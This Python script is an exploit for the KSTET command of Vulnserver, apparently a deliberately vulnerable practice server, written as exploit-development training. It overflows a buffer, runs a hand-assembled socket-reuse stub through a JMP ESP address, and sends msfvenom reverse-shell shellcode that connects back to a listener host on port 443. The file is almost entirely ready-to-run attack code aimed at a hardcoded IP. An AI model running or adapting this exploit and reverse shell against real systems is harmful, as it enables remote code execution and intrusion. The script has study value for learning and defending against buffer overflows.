#!/usr/bin/python
# Author: Xavi Bel
# Date: 30/06/2019
# Website: xavibel.com
# Vulnserver - KSET - Using socket reuse

import socket
import os
import sys
import time

# socket reuse technique
# 35 bytes + 34 bytes of padding = 69 bytes
exploit  = ""
exploit += "\x54"                   # PUSH ESP
exploit += "\x59"                   # POP ECX
exploit += "\x66\x81\xC1\xCC\x05"   # ADD CX,5C9
exploit += "\x83\xEC\x50"           # SUB ESP, 50
exploit += "\x33\xD2"               # XOR EDX,EDX
exploit += "\x52"                   # PUSH EDX
exploit += "\x80\xC6\x02"           # ADD DH,2
exploit += "\x52"                   # PUSH EDX
exploit += "\x54"                   # PUSH ESP
exploit += "\x5A"                   # POP EDX
exploit += "\x80\xC2\x38"           # ADD DL, 36
exploit += "\x52"                   # PUSH EDX
exploit += "\xFF\x31"               # PUSH DWORD PTR DS:[ECX]
exploit += "\xB8\x88\x2C\x25\x40"   # MOV EAX, 40252C88
exploit += "\xC1\xE8\x08"           # SHR EAX, 8    
exploit += "\xFF\xD0"               # CALL EAX

exploit += "\x90" * 34

# 625011AF - JMP ESP
crash = "\x20" + exploit + "\xAF\x11\x50\x62" + "\x90" * 18 + "\xEB\xA3"

buffer="KSTET "
buffer+= crash + "\r\n"
print "[*] Sending exploit!"

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.1.99", 9999))
expl.send(buffer)

time.sleep(1)

# msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=192.168.1.88 EXITFUNC=thread -b "\x00" -f python | sed 's/buf/shellcode/g'
# 351 bytes
shellcode =  ""
shellcode += "\xbe\x8e\x14\x1d\x2d\xda\xd4\xd9\x74\x24\xf4\x5d\x29"
shellcode += "\xc9\xb1\x52\x83\xed\xfc\x31\x75\x0e\x03\xfb\x1a\xff"
shellcode += "\xd8\xff\xcb\x7d\x22\xff\x0b\xe2\xaa\x1a\x3a\x22\xc8"
shellcode += "\x6f\x6d\x92\x9a\x3d\x82\x59\xce\xd5\x11\x2f\xc7\xda"
shellcode += "\x92\x9a\x31\xd5\x23\xb6\x02\x74\xa0\xc5\x56\x56\x99"
shellcode += "\x05\xab\x97\xde\x78\x46\xc5\xb7\xf7\xf5\xf9\xbc\x42"
shellcode += "\xc6\x72\x8e\x43\x4e\x67\x47\x65\x7f\x36\xd3\x3c\x5f"
shellcode += "\xb9\x30\x35\xd6\xa1\x55\x70\xa0\x5a\xad\x0e\x33\x8a"
shellcode += "\xff\xef\x98\xf3\xcf\x1d\xe0\x34\xf7\xfd\x97\x4c\x0b"
shellcode += "\x83\xaf\x8b\x71\x5f\x25\x0f\xd1\x14\x9d\xeb\xe3\xf9"
shellcode += "\x78\x78\xef\xb6\x0f\x26\xec\x49\xc3\x5d\x08\xc1\xe2"
shellcode += "\xb1\x98\x91\xc0\x15\xc0\x42\x68\x0c\xac\x25\x95\x4e"
shellcode += "\x0f\x99\x33\x05\xa2\xce\x49\x44\xab\x23\x60\x76\x2b"
shellcode += "\x2c\xf3\x05\x19\xf3\xaf\x81\x11\x7c\x76\x56\x55\x57"
shellcode += "\xce\xc8\xa8\x58\x2f\xc1\x6e\x0c\x7f\x79\x46\x2d\x14"
shellcode += "\x79\x67\xf8\xbb\x29\xc7\x53\x7c\x99\xa7\x03\x14\xf3"
shellcode += "\x27\x7b\x04\xfc\xed\x14\xaf\x07\x66\xdb\x98\x06\x2e"
shellcode += "\xb3\xda\x08\xcf\xf8\x52\xee\xa5\xee\x32\xb9\x51\x96"
shellcode += "\x1e\x31\xc3\x57\xb5\x3c\xc3\xdc\x3a\xc1\x8a\x14\x36"
shellcode += "\xd1\x7b\xd5\x0d\x8b\x2a\xea\xbb\xa3\xb1\x79\x20\x33"
shellcode += "\xbf\x61\xff\x64\xe8\x54\xf6\xe0\x04\xce\xa0\x16\xd5"
shellcode += "\x96\x8b\x92\x02\x6b\x15\x1b\xc6\xd7\x31\x0b\x1e\xd7"
shellcode += "\x7d\x7f\xce\x8e\x2b\x29\xa8\x78\x9a\x83\x62\xd6\x74"
shellcode += "\x43\xf2\x14\x47\x15\xfb\x70\x31\xf9\x4a\x2d\x04\x06"
shellcode += "\x62\xb9\x80\x7f\x9e\x59\x6e\xaa\x1a\x79\x8d\x7e\x57"
shellcode += "\x12\x08\xeb\xda\x7f\xab\xc6\x19\x86\x28\xe2\xe1\x7d"
shellcode += "\x30\x87\xe4\x3a\xf6\x74\x95\x53\x93\x7a\x0a\x53\xb6"

expl.send("\x90" * 5 + shellcode + "\x90" * 156)

expl.close()